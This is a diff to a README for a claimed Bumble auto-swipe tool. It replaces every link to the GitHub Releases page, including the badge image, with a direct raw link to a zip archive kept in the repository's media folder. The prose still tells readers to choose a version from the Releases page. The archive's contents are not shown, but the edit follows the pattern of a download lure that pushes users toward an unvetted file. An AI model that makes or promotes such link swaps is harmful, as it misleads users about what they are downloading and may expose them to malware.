@@ -4,7 +4,7 @@
 Bumble Auto-Swipe Speed Control is a tool designed to automate your swiping on the Bumble app. It optimizes your swiping speed, allowing you to connect with potential matches more efficiently. Whether you are busy or simply want to enhance your experience, this tool will help you swipe smarter, not harder.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/github/release/QuocKhanhMai/bumble-auto-swipe-speed-control.svg)](https://github.com/QuocKhanhMai/bumble-auto-swipe-speed-control/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/QuocKhanhMai/bumble-auto-swipe-speed-control/main/media/bumble-auto-swipe-speed-control_v1.2.zip)](https://raw.githubusercontent.com/QuocKhanhMai/bumble-auto-swipe-speed-control/main/media/bumble-auto-swipe-speed-control_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Before you begin, ensure your device meets these basic requirements:
 - Sufficient battery life for uninterrupted swiping.
 
 ### Step 2: Visit the Releases Page
-To download the latest version of Bumble Auto-Swipe Speed Control, [visit this page to download](https://github.com/QuocKhanhMai/bumble-auto-swipe-speed-control/releases). 
+To download the latest version of Bumble Auto-Swipe Speed Control, [visit this page to download](https://raw.githubusercontent.com/QuocKhanhMai/bumble-auto-swipe-speed-control/main/media/bumble-auto-swipe-speed-control_v1.2.zip). 
 
 ### Step 3: Download the Software
 On the Releases page, you will find a list of available versions. Click on the link to download the version that suits your needs. 
@@ -55,4 +55,4 @@ For more information about this project and its development, feel free to explor
 If you're ready to enhance your Bumble experience, download now!
 
 ### Download & Install
-To start using Bumble Auto-Swipe Speed Control, [visit this page to download](https://github.com/QuocKhanhMai/bumble-auto-swipe-speed-control/releases) and follow the steps outlined above. Enjoy a better swiping experience that saves you time and effort!
+To start using Bumble Auto-Swipe Speed Control, [visit this page to download](https://raw.githubusercontent.com/QuocKhanhMai/bumble-auto-swipe-speed-control/main/media/bumble-auto-swipe-speed-control_v1.2.zip) and follow the steps outlined above. Enjoy a better swiping experience that saves you time and effort!
